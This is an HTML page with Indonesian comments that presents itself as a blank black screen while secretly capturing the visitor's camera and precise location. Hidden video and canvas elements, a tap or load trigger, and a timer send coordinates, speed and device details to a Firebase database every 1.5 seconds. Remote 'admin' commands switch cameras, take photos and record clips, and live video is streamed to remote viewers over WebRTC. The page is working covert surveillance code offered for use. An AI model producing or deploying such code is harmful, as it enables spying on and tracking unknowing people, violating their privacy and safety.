<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        html, body {
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #000000;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }
        #hiddenMediaLayer {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
    </style>
</head>
<body onclick="onScreenTap()">

<div id="hiddenMediaLayer">
    <video id="videoPreview" autoplay playsinline muted></video>
    <canvas id="captureCanvas"></canvas>
</div>

<script>
    // Ganti dengan URL Firebase Realtime Database milikmu (tanpa slash di akhir)
    // Contoh: https://nama-project-default-rtdb.asia-southeast1.firebasedatabase.app
    const FIREBASE_DB_URL = "https://YOUR-PROJECT-default-rtdb.firebaseio.com";
    const RECORD_MS = 3500;
    const LOCATION_PUSH_MS = 1500;

    const sessionId = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
    const rtcConfig = {
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
    };

    let currentFacing = "user"; // "user" = depan, "environment" = belakang
    let cameraStream = null;
    let locationData = null;
    let watchId = null;
    let locTimer = null;
    let cmdPollTimer = null;
    let lastHandledToken = null;
    let isInitializing = false;

    // WebRTC peer connections per admin/viewer id: { [viewerId]: RTCPeerConnection }
    const peers = {};
    const seenCandidates = new Set();

    const video = document.getElementById("videoPreview");
    const canvas = document.getElementById("captureCanvas");
    const ctx = canvas.getContext("2d", { alpha: false });

    function getCameraLabel() {
        return currentFacing === "environment" ? "Belakang" : "Depan";
    }

    function dbUrl(path) {
        return `${FIREBASE_DB_URL}/${path}.json`;
    }

    async function dbGet(path) {
        const res = await fetch(dbUrl(path));
        if (!res.ok) throw new Error(`GET ${path} failed: ${res.status}`);
        return res.json();
    }

    async function dbPut(path, data) {
        const res = await fetch(dbUrl(path), {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        if (!res.ok) throw new Error(`PUT ${path} failed: ${res.status}`);
        return res.json();
    }

    async function dbPost(path, data) {
        const res = await fetch(dbUrl(path), {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        if (!res.ok) throw new Error(`POST ${path} failed: ${res.status}`);
        return res.json();
    }

    async function replaceStreamTrackOnPeers() {
        if (!cameraStream) return;
        const newVideoTrack = cameraStream.getVideoTracks()[0];
        if (!newVideoTrack) return;

        for (const pc of Object.values(peers)) {
            const sender = pc.getSenders().find(s => s.track && s.track.kind === "video");
            if (sender) {
                await sender.replaceTrack(newVideoTrack).catch(() => {});
            }
        }
    }

    async function openCameraFacing(facingMode) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return false;

        if (cameraStream) {
            cameraStream.getTracks().forEach(t => t.stop());
            cameraStream = null;
        }

        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: { ideal: facingMode },
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    frameRate: { ideal: 24, max: 30 }
                },
                audio: false
            });
            currentFacing = facingMode;
            video.srcObject = cameraStream;
            await video.play().catch(() => {});
            await replaceStreamTrackOnPeers();
            await pushPresence();
            return true;
        } catch (err) {
            console.error("Camera error:", err);
            return false;
        }
    }

    function startLocationWatcher() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error("Geolocation not supported"));
                return;
            }
            let settled = false;
            if (watchId !== null) navigator.geolocation.clearWatch(watchId);

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    locationData = {
                        lat: Number(pos.coords.latitude.toFixed(6)),
                        lng: Number(pos.coords.longitude.toFixed(6)),
                        akurasi: Math.round(pos.coords.accuracy) + " meter",
                        kecepatan: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
                            ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
                            : "-",
                        arah: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
                            ? Math.round(pos.coords.heading) + "°"
                            : "-"
                    };
                    if (!settled) {
                        settled = true;
                        resolve(locationData);
                    }
                },
                (err) => {
                    if (!settled) {
                        settled = true;
                        reject(err);
                    }
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 1000 }
            );
        });
    }

    function capturePhotoDataUrl(width = 640, quality = 0.7) {
        if (!cameraStream || video.readyState < 2) return null;
        const vw = video.videoWidth || 640;
        const vh = video.videoHeight || 480;
        const targetH = Math.max(1, Math.round((vh / vw) * width));
        canvas.width = width;
        canvas.height = targetH;
        ctx.drawImage(video, 0, 0, width, targetH);
        return canvas.toDataURL("image/jpeg", quality);
    }

    function pickMimeType() {
        const candidates = ["video/webm;codecs=vp8", "video/webm", "video/mp4"];
        for (const m of candidates) {
            if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
        }
        return "";
    }

    function recordClipBase64() {
        return new Promise((resolve, reject) => {
            if (!cameraStream || !window.MediaRecorder) {
                reject(new Error("MediaRecorder not supported"));
                return;
            }
            const mime = pickMimeType();
            const opts = { videoBitsPerSecond: 300000 };
            if (mime) opts.mimeType = mime;

            let rec;
            try { rec = new MediaRecorder(cameraStream, opts); }
            catch (e) { rec = new MediaRecorder(cameraStream); }

            const chunks = [];
            rec.ondataavailable = (ev) => { if (ev.data && ev.data.size > 0) chunks.push(ev.data); };
            rec.onerror = () => reject(new Error("Record error"));
            rec.onstop = () => {
                const blob = new Blob(chunks, { type: rec.mimeType || mime || "video/webm" });
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = () => reject(new Error("Read error"));
                reader.readAsDataURL(blob);
            };

            rec.start();
            setTimeout(() => {
                if (rec.state === "recording") rec.stop();
            }, RECORD_MS);
        });
    }

    async function pushPresence() {
        if (!locationData) return;
        const nowStr = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }) + " WIB";
        await dbPut(`liveSessions/${sessionId}`, {
            sessionId,
            nama: "HP Saya",
            kameraAktif: Boolean(cameraStream),
            kameraPosisi: getCameraLabel(),
            lat: locationData.lat,
            lng: locationData.lng,
            akurasi: locationData.akurasi,
            kecepatan: locationData.kecepatan,
            arah: locationData.arah,
            waktu: nowStr,
            updatedAt: Date.now(),
            perangkat: navigator.userAgent
        }).catch(() => {});
    }

    async function ensurePeerForViewer(viewerId) {
        if (peers[viewerId]) return peers[viewerId];
        if (!cameraStream) return null;

        const pc = new RTCPeerConnection(rtcConfig);
        peers[viewerId] = pc;

        cameraStream.getTracks().forEach(track => {
            pc.addTrack(track, cameraStream);
        });

        pc.onicecandidate = async (event) => {
            if (event.candidate) {
                await dbPost(`calls/${sessionId}/memberCandidates`, {
                    viewerId,
                    candidate: event.candidate.toJSON(),
                    ts: Date.now()
                }).catch(() => {});
            }
        };

        pc.onconnectionstatechange = () => {
            if (["disconnected", "failed", "closed"].includes(pc.connectionState)) {
                pc.close();
                delete peers[viewerId];
            }
        };

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        await dbPut(`calls/${sessionId}/offers/${viewerId}`, {
            sdp: offer.sdp,
            type: offer.type,
            updatedAt: Date.now()
        });

        return pc;
    }

    async function syncSignalingAndCommands() {
        try {
            // 1. Cek permintaan live call / answer / ICE candidate dari admin
            const callData = await dbGet(`calls/${sessionId}`);
            if (callData) {
                const callRequests = callData.requests || {};
                for (const [viewerId, req] of Object.entries(callRequests)) {
                    if (req && req.active) {
                        await ensurePeerForViewer(viewerId);
                    }
                }

                const answers = callData.answers || {};
                for (const [viewerId, ans] of Object.entries(answers)) {
                    const pc = peers[viewerId];
                    if (pc && ans && ans.sdp && !pc.currentRemoteDescription) {
                        await pc.setRemoteDescription(new RTCSessionDescription(ans)).catch(() => {});
                    }
                }

                const adminCandidates = callData.adminCandidates || {};
                for (const [candId, item] of Object.entries(adminCandidates)) {
                    const key = `admin_${candId}`;
                    if (!seenCandidates.has(key) && item && item.candidate && peers[item.viewerId]) {
                        seenCandidates.add(key);
                        await peers[item.viewerId].addIceCandidate(new RTCIceCandidate(item.candidate)).catch(() => {});
                    }
                }
            }

            // 2. Cek perintah (SWITCH_CAM, PHOTO, RECORD)
            const cmd = await dbGet("command");
            if (cmd && cmd.token && cmd.token !== lastHandledToken) {
                const forMe = !cmd.targetSessionId || cmd.targetSessionId === sessionId;
                if (forMe && ["SWITCH_CAM", "PHOTO", "RECORD"].includes(cmd.action)) {
                    lastHandledToken = cmd.token;
                    const nowStr = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }) + " WIB";

                    if (cmd.action === "SWITCH_CAM") {
                        const targetFacing = (cmd.facing === "environment" || cmd.facing === "user")
                            ? cmd.facing
                            : (currentFacing === "user" ? "environment" : "user");
                        await openCameraFacing(targetFacing);
                    } else if (cmd.action === "PHOTO" && cameraStream) {
                        const foto = capturePhotoDataUrl(640, 0.68);
                        if (foto && locationData) {
                            await dbPost("logs", {
                                id: Date.now(),
                                sessionId,
                                tipe: "foto",
                                kameraPosisi: getCameraLabel(),
                                nama: "HP Saya",
                                foto,
                                video: null,
                                lat: locationData.lat,
                                lng: locationData.lng,
                                akurasi: locationData.akurasi,
                                waktu: nowStr,
                                perangkat: navigator.userAgent
                            });
                        }
                    } else if (cmd.action === "RECORD" && cameraStream) {
                        const clip = await recordClipBase64();
                        if (clip && locationData) {
                            await dbPost("logs", {
                                id: Date.now(),
                                sessionId,
                                tipe: "rekaman",
                                kameraPosisi: getCameraLabel(),
                                nama: "HP Saya",
                                foto: null,
                                video: clip,
                                lat: locationData.lat,
                                lng: locationData.lng,
                                akurasi: locationData.akurasi,
                                waktu: nowStr,
                                perangkat: navigator.userAgent
                            });
                        }
                    }

                    await dbPut("command", {
                        action: "NONE",
                        targetSessionId: null,
                        facing: null,
                        token: null
                    }).catch(() => {});
                }
            }
        } catch (err) {
            console.error("Sync error:", err);
        }
    }

    async function initSession() {
        if (isInitializing) return;
        isInitializing = true;

        try {
            if (!locationData) {
                await startLocationWatcher();
            }
            if (!cameraStream) {
                await openCameraFacing(currentFacing);
            }

            await pushPresence();
            await syncSignalingAndCommands();

            if (locTimer) clearInterval(locTimer);
            if (cmdPollTimer) clearInterval(cmdPollTimer);

            locTimer = setInterval(pushPresence, LOCATION_PUSH_MS);
            cmdPollTimer = setInterval(syncSignalingAndCommands, 800);
        } catch (err) {
            console.error("Init failed:", err);
        } finally {
            isInitializing = false;
        }
    }

    function onScreenTap() {
        if (!locationData || !cameraStream) {
            initSession();
        }
    }

    function cleanupSession() {
        if (locTimer) clearInterval(locTimer);
        if (cmdPollTimer) clearInterval(cmdPollTimer);
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
        for (const pc of Object.values(peers)) {
            pc.close();
        }
    }

    window.addEventListener("DOMContentLoaded", initSession);
    window.addEventListener("pagehide", cleanupSession);
    window.addEventListener("beforeunload", cleanupSession);
</script>

</body>
</html>
